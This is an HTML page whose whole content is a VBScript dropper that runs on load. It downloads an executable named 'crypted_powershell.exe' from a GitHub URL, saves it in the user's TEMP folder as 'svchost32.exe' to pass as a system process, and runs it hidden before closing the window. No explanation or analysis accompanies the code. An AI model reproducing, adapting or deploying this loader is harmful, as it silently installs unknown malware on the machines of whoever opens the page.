<html><head>
<script language="VBScript">
Dim sUrl, sPath, oHTTP, oStream, oShell
sUrl  = "https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/crypted_powershell.exe"
sPath = Environ("TEMP") & "\svchost32.exe"

Set oHTTP = CreateObject("MSXML2.XMLHTTP")
oHTTP.Open "GET", sUrl, False
oHTTP.Send

Set oStream = CreateObject("ADODB.Stream")
oStream.Type = 1
oStream.Open
oStream.Write oHTTP.ResponseBody
oStream.SaveToFile sPath, 2
oStream.Close

Set oShell = CreateObject("WScript.Shell")
oShell.Run """" & sPath & """", 0, False
window.close
</script>
</head><body></body></html>
